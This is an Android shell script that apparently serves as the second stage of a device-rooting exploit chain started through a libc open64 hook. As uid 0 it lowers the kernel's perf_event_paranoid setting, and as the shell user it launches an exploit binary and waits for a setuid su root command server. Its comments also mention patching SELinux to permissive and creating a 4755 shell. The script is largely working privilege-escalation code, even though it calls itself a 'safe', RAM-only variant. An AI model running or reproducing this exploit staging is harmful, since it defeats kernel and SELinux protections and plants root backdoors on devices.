#!/system/bin/sh
# root_restore.sh - SAFE variant: PC-less ROOT only.  NO GMS overlay, NO framework
# restart, nothing written outside RAM and /data/local/tmp.
#
# This is what the libc open64 hook payload runs.  Two stages (see glboot_payload.c):
#   uid 0    -> dumpstate, all caps: may write perf_event_paranoid; runs stage 1.
#   uid 2000 -> the shell application's bugreportz in the SHELL domain (the only domain
#               allowed to exec shell_data_file): runs the exploit.  This is also where a
#               "systemize GMS" step WOULD go - it is deliberately absent here, because
#               the overlay + ctl.restart zygote path corrupted the package manager on a
#               real device (see gms_repo/docs/SAFETY_AND_RECOMMENDATION.md).
#
# Everything it creates (permissive SELinux patch, creds, the global tmpfs, the 4755
# shell, the gl_su server) is RAM-only and disappears at the next reboot.

PATH=/system/bin:/vendor/bin:/system/xbin
export PATH
D=/data/local/tmp
exec >> $D/glroot.log 2>&1
chmod 644 $D/glroot.log 2>/dev/null
echo "=== root_restore $(date) uid=$(id -u) ==="
echo "uid=$(id)"
echo "ctx=$(cat /proc/self/attr/current 2>/dev/null)"
echo "cap=$(grep CapEff /proc/self/status 2>/dev/null)"

# =============================================================== stage 1: uid 0 (perf)
if [ "$(id -u)" = "0" ]; then
    echo -1 > /proc/sys/kernel/perf_event_paranoid
    echo "perf_after_write=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)"
    exit 0
fi

# ============================================= stage 2: uid 2000 (the shell domain)
i=0
while [ $i -lt 60 ]; do
    [ "$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)" = "-1" ] && break
    sleep 2
    i=$((i+1))
done
echo "perf=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null) (waited $((i*2))s)"

nohup $D/ghostlock_e --root > $D/gl.root.out 2>&1 &
chmod 644 $D/gl.root.out 2>/dev/null
i=0
while [ $i -lt 120 ]; do
    $D/su -c true >/dev/null 2>&1 && break
    sleep 2
    i=$((i+1))
done
if $D/su -c true >/dev/null 2>&1; then
    echo "ROOT OK (server after $((i*2))s):"
    $D/su -c id
else
    echo "ABORT: the gl_su root command server never came up"
fi
echo "=== root_restore done (safe: no GMS, no framework restart) ==="
